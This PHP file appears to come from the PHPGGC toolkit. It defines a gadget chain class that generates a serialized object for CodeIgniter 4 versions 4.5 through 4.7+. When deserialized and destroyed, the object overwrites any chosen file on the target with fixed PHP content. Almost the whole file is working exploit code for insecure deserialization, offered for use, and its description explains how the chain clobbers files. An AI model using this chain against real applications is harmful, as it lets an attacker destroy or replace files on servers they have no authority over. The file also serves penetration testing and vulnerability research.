<?php

namespace GadgetChain\CodeIgniter4;

class FD3 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '4.5 <= 4.7+';
    public static $vector = '__destruct';
    public static $author = 'reverseth';
    public static $information = 'Actually, this POP chain writes (or replaces the content of) the choosen file with the following content : "<?php return array (0 => \'\',);" It is also possible to choose a string to write inside the array ("<?php return array (0 => \'<here>\',);"), but I did not find a way to execute it. Thus, I decided to push it as a FD, and not as a FW.';

    public function generate(array $parameters)
    {
        $obj = new \CodeIgniter\Autoloader\FileLocatorCached($parameters['remote_path']);
        $obj->cacheHandler = new \CodeIgniter\Cache\FactoriesCache\FileVarExportHandler();
        return $obj;
    }
}